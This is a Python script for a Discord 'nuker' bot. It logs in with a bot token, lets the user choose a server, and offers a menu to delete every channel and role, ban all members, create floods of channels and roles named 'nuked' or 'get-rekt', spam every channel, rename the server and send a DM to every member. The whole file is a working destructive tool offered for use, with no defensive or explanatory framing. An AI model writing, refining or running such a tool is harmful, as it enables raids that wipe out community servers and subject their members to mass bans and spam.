import discord
import asyncio
import sys
import random
import time
import os
from discord.ext import commands

intents = discord.Intents.all()
client = commands.Bot(command_prefix="!", intents=intents, help_command=None)

guild_target = None
running = True
cnt = {"v": 0}
chan_list = ["nuked-by-bot", "get-rekt", "owned"]
role_list = ["nuked", "rekt", "owned"]

R = "\033[91m"
W = "\033[97m"
X = "\033[0m"

@client.event
async def on_ready():
    global guild_target
    os.system("cls || clear")
    
    print(f"{R}[+] LOGGED AS: {W}{client.user}{X}")
    print(f"{R}============================={X}")
    
    guilds = list(client.guilds)
    for i, g in enumerate(guilds):
        print(f"{R}[{i+1}] {W}{g.name} ({g.id}){X}")
    
    while True:
        try:
            ch = int(input(f"\n{R}[>] SELECT SERVER: {W}")) - 1
            if 0 <= ch < len(guilds):
                guild_target = guilds[ch]
                break
        except:
            pass
    
    os.system("cls || clear")
    print(f"{R}[+] TARGET: {W}{guild_target.name}{X}")
    print(f"{R}============================={X}")
    await show_menu()

async def safe_delete_channel(channel):
    try:
        await channel.delete()
        cnt["v"] += 1
        print(f"{R}[+] DELETED: {W}{channel.name}{X}")
    except discord.Forbidden:
        pass
    except discord.HTTPException:
        await asyncio.sleep(1)
        await safe_delete_channel(channel)

async def safe_send(channel, msg):
    try:
        await channel.send(msg)
        cnt["v"] += 1
        return True
    except:
        return False

async def show_menu():
    global running
    while running:
        print(f"\n{R}┌──────────────────────┐{X}")
        print(f"{R}│   {W}NUKER MENU{R}        │{X}")
        print(f"{R}├──────────────────────┤{X}")
        print(f"{R}│ {W}[1] DELETE CHANNELS{R}  │{X}")
        print(f"{R}│ {W}[2] DELETE ROLES{R}     │{X}")
        print(f"{R}│ {W}[3] BAN ALL MEMBERS{R}   │{X}")
        print(f"{R}│ {W}[4] CREATE CHANNELS{R}   │{X}")
        print(f"{R}│ {W}[5] CREATE ROLES{R}      │{X}")
        print(f"{R}│ {W}[6] SPAM MESSAGES{R}     │{X}")
        print(f"{R}│ {W}[7] CHANGE NAME{R}       │{X}")
        print(f"{R}│ {W}[8] DM ALL{R}            │{X}")
        print(f"{R}│ {W}[0] EXIT{R}              │{X}")
        print(f"{R}└──────────────────────┘{X}")
        
        c = input(f"{R}[>] OPTION: {W}").strip()
        
        if c == "1": await del_chans()
        elif c == "2": await del_roles()
        elif c == "3": await ban_all()
        elif c == "4": await create_chans()
        elif c == "5": await create_roles()
        elif c == "6": await spam_all()
        elif c == "7": await change_name()
        elif c == "8": await dm_all()
        elif c == "0":
            running = False
            await client.close()
            os._exit(0)

async def del_chans():
    start = time.time()
    cnt["v"] = 0
    for ch in guild_target.channels:
        await safe_delete_channel(ch)
    print(f"\n{R}[+] {W}{cnt['v']} CHANNELS DELETED IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

async def del_roles():
    start = time.time()
    cnt["v"] = 0
    for r in guild_target.roles:
        if r.name != "@everyone":
            try:
                await r.delete()
                cnt["v"] += 1
                print(f"{R}[+] DELETED: {W}{r.name}{X}")
            except:
                pass
    print(f"\n{R}[+] {W}{cnt['v']} ROLES DELETED IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

async def ban_all():
    if input(f"{R}[>] TYPE 'yes': {W}").lower() != "yes":
        return
    start = time.time()
    cnt["v"] = 0
    await guild_target.fetch_members()
    for m in guild_target.members:
        if m.id != client.user.id:
            try:
                await m.ban(reason="Nuked")
                cnt["v"] += 1
                print(f"{R}[+] BANNED: {W}{m.name}{X}")
                await asyncio.sleep(0.5)
            except:
                pass
    print(f"\n{R}[+] {W}{cnt['v']} MEMBERS BANNED IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

async def create_chans():
    try:
        n = int(input(f"{R}[>] CHANNEL COUNT: {W}"))
    except:
        return
    start = time.time()
    cnt["v"] = 0
    for i in range(n):
        name = chan_list[i % len(chan_list)]
        try:
            await guild_target.create_text_channel(name)
            cnt["v"] += 1
            print(f"{R}[+] CREATED: {W}{name}{X}")
            await asyncio.sleep(0.5)
        except:
            pass
    print(f"\n{R}[+] {W}{cnt['v']} CHANNELS CREATED IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

async def create_roles():
    try:
        n = int(input(f"{R}[>] ROLE COUNT: {W}"))
    except:
        return
    start = time.time()
    cnt["v"] = 0
    for i in range(n):
        name = role_list[i % len(role_list)]
        try:
            await guild_target.create_role(name=name, color=discord.Color.from_rgb(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
            cnt["v"] += 1
            print(f"{R}[+] CREATED: {W}{name}{X}")
        except:
            pass
    print(f"\n{R}[+] {W}{cnt['v']} ROLES CREATED IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

async def spam_all():
    try:
        per = int(input(f"{R}[>] PER CHANNEL: {W}"))
    except:
        return
    msg = input(f"{R}[>] MESSAGE: {W}")
    start = time.time()
    cnt["v"] = 0
    for ch in guild_target.text_channels:
        for i in range(per):
            await safe_send(ch, msg)
    print(f"\n{R}[+] {W}{cnt['v']} MESSAGES SENT IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

async def change_name():
    name = input(f"{R}[>] NEW NAME: {W}")
    try:
        await guild_target.edit(name=name)
        print(f"{R}[+] NAME CHANGED TO: {W}{name}{X}")
    except:
        pass
    input(f"{R}[>] PRESS ENTER{X}")

async def dm_all():
    msg = input(f"{R}[>] MESSAGE: {W}")
    start = time.time()
    cnt["v"] = 0
    await guild_target.fetch_members()
    for m in guild_target.members:
        if m.id != client.user.id:
            try:
                await m.send(msg)
                cnt["v"] += 1
                print(f"{R}[+] DM SENT: {W}{m.name}{X}")
                await asyncio.sleep(0.5)
            except:
                pass
    print(f"\n{R}[+] {W}{cnt['v']} DMS SENT IN {time.time()-start:.2f}s{X}")
    input(f"{R}[>] PRESS ENTER{X}")

while True:
    token = input(f"\n{R}[>] TOKEN: {W}").strip()
    if token:
        break

try:
    client.run(token, reconnect=True)
except:
    os.system("cls || clear")
    print(f"{R}[-] INVALID TOKEN{X}")
    time.sleep(2)
    os.execl(sys.executable, sys.executable, *sys.argv)
